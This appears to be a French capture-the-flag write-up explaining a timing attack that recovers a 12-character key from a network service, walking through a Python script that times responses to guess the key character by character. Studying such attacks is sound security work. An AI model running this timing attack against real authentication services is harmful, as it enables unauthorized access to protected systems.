## Contexte
Retrouvez la clé de 12 caractères permettant de vous authentifier sur le service réseau.

Le titre est assez explicite il faut faire une timing attack

## Le principe

C’est une attaque qui consiste à deviner un secret en mesurant le temps que met le serveur à répondre à nos essais.

Le serveur compare très probablement la clé caractère par caractère et s’arrête dès qu’un caractère est faux.
Si on envoie une tentative, la durée entre notre envoi et la réponse du serveur dépend donc de jusqu’où le serveur a réussi la comparaison. 
En mesurant ce temps et en testant tous les caractères possibles à une position donnée, on peut deviner le caractère qui fait prendre le plus de temps au serveur : c’est probablement le bon. Répéter ceci pour chaque position permet de reconstruire la clé entière.

## Méthode que j’ai utilisée

Script python: [time_attack.py](./time_attack.py)

On va decortiquer mon script:

```
CHARS = "0123456789-"
KEY_LEN = 12
BUF = 1024

```

**J'ai perdu enormement de temps a comprendre les charactere qu'il y avait dans la key...**

CHARS : l’ensemble des caractères que l’on va tester pour chaque position de la clé. Ici : chiffres 0 à 9 et le caractère -
KEY_LEN : longueur de la clé attendue par le service .
BUF : taille du tampon pour la lecture réseau (s.recv(BUF)). (Au cas ou il y'est un message lors de la connexion)

```
 s = socket.socket()
    s.connect((HOST, PORT))
try:
        print(s.recv(BUF).decode(errors='ignore'))
    except:
        pass
```

Classique: on ouvre la connexion rien d'important 



```
    key = ""
    for i in range(KEY_LEN):
        best_char = None
        best_time = 0.0
        print(f"Position {i+1} - : '{key}'")
```

key : la clé que l’on découvre progressivement ; initialement vide.

La boucle for i in range(KEY_LEN) itère une fois par position (12 fois ici).

best_char et best_time servent à mémoriser, pour la position courante, le caractère qui a donné le plus grand temps de réponse.

```
        for c in CHARS:
            attempt = (key + c).ljust(KEY_LEN, "0")   # on envoie exactement 12 chars

```


`for c in CHARS`pour chaque caractère possible, on envoie une tentative

`attempt = (key + c).ljust(KEY_LEN, "0")`

key + c : construit la tentative avec les caractères découverts précédemment + le candidat c pour la position courante.

.ljust(KEY_LEN, "0") : on complète la chaîne pour qu’elle fasse exactement KEY_LEN caractères en ajoutant '0' à droite.



```
            start = time.time()
            s.sendall(attempt.encode() + b"\n")
            data = s.recv(BUF)
            elapsed = time.time() - start
            print(f"    try {attempt} -> {elapsed:.4f}s")
```

`time.time()` On chope l'heure avant la connexion

`s.sendall(attempt.encode() + b"\n")`

`attempt.encode()` transforme la chaîne en octets, format oblige.

`+ b"\n"` ajoute un saut de ligne ; beaucoup de services traitent les lignes quand ils reçoivent un \n.

sendall envoie tous les octets à la socket.

`data = s.recv(BUF)` on attend la réponse du serveur. La fonction bloque (attend) jusqu’à ce que le serveur envoie quelque chose.

`elapsed = time.time() - start` mesure la durée totale entre l’envoi et la réception : c’est ce qu’on va analyser.

```
            if elapsed > best_time:
                best_time = elapsed
                best_char = c


```

On choisie le caractere qui prend le plus de temps

```
        key += best_char
        print(f"Found: '{best_char}' -> key pour le moment: {key}\n")

```
Et on l'ajoute a la key

## Resultat

Voila avec ca on a reussi a trouver la clef !



